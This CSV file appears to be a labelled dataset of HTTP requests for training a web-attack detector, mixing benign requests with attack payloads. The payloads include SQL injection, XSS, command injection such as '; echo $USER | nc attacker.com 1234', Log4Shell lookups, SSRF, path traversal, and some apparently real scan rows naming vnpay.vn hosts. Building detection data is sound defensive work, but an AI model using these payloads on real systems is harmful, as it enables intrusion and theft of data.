method,path,query,headers,body,ua,label
GET,/favicon.ico,,,,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /feed/news.rss,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,id=1&id=2,,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
POST,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
POST,/products,id=123,Host: example.com; Accept: */*,username=user175&password=pass101,Mozilla/5.0 (Linux; Android 11),0
PUT,/admin,,Host: example.com; Accept: */*,input=admin'--,curl/7.68.0,1
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/favicon.ico,,,,,0
GET,/,,${os.system('id')},,,1
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,' or '1'='1,,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
DELETE,/index.php,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",curl/7.68.0,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,http://127.0.0.1:22,,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/favicon.ico,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,java\tscript:alert(1),,,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/favicon.ico,,,,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,javascript:alert(1),,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,"{""alg"":""none""}",,,1
DELETE,/search,,Host: example.com; Accept: */*,input=admin'--,curl/7.68.0,1
GET,/,,GET /feed/news.rss,,,0
GET,/favicon.ico,,,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,`uname -a`,,,1
GET,/,,`uname -a`,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
DELETE,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/favicon.ico,,,,,0
GET,/,,javascript:alert(1),,,1
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,__proto__[admin]=true,,,1
POST,/api/v1/users,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,Nikto/2.1.6,1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,expect://id,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,Host: evil.com,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,GET /api/v1/ping,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/favicon.ico,,,,,0
POST,/products,id=123,Host: example.com; Accept: */*,username=user583&password=pass733,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,GET /search?q=security,,,0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,GET /search?q=security,,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,GET /search?q=C%23,,,0
POST,/,,Host: example.com; Accept: */*,username=user739&password=pass312,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,GET /robots.txt,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,__proto__[admin]=true,,,1
GET,/wp-admin/admin-ajax.php,action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,url=http://malicious.com,,,1
GET,/api/v1/users,q=| cat /etc/passwd,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,GET /sitemap.xml,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,%0als,,,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,GET /feed/news.rss,,,0
GET,/opencms/cmisatom/cmis-online/type,"id=1%27""><svg%20onload=alert(document.domain)>","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Content-Type: application/cmisquery+xml; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.140",,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.140",1
GET,/,,GET /api/v1/products,,,0
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
POST,/checkout,,Host: example.com; Accept: */*,username=user939&password=pass512,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
DELETE,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,' or '1'='1,,,1
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,' or '1'='1,,,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,GET /favicon.ico,,,0
GET,/wp-json/lp/v1/courses/archive-course,order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1,"Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,expect://id,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /search?q=1+1=2,,,0
PUT,/admin,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nikto/2.1.6,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nikto/2.1.6,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=' OR 'x'='x,sqlmap/1.5.2,1
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,GET /static/css/style.css,,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,%0als,,,1
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,http://127.0.0.1:22,,,1
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user553&password=pass734,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /images/logo.png,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,php://input,,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,Host: evil.com,,,1
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/search,q=..\..\..\windows\system32,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
POST,/login,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nmap Scripting Engine,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,Host: evil.com,,,1
GET,/index.php,q=&& whoami,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /search?q=C%23,,,0
POST,/search,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,GET /,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,expect://id,,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,GET /health,,,0
GET,/,,GET /user/profile,,,0
GET,/,,GET /health,,,0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,| id,,,1
GET,/,,GET /docs/api/introduction,,,0
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,POST /cart/add?product_id=99,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
PUT,/search,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nikto/2.1.6,1
GET,/,,GET /api/v1/products/101,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,GET /api/v1/products,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/login,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/favicon.ico,,,,,0
GET,/search,q=' OR 1=1--,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
POST,/profile,,Host: example.com; Accept: */*,username=user842&password=pass604,Mozilla/5.0 (Linux; Android 11),0
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,; cat /etc/passwd,,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/index.php,q=<img src=x onerror=alert(1)>,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,javascript:alert(1),,,1
GET,/,,GET /robots.txt,,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,GET /dashboard?view=summary&time=30d,,,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,' or '1'='1,,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/search,q=| cat /etc/passwd,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,$(whoami),,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/favicon.ico,,,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,javascript:alert(1),,,1
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,GET /settings/security,,,0
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,//////////////////etc/passwd,,,1
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/hss/,q=%27%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29",1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,|| ls -la,,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/favicon.ico,,,,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,GET /auth/google/callback,,,0
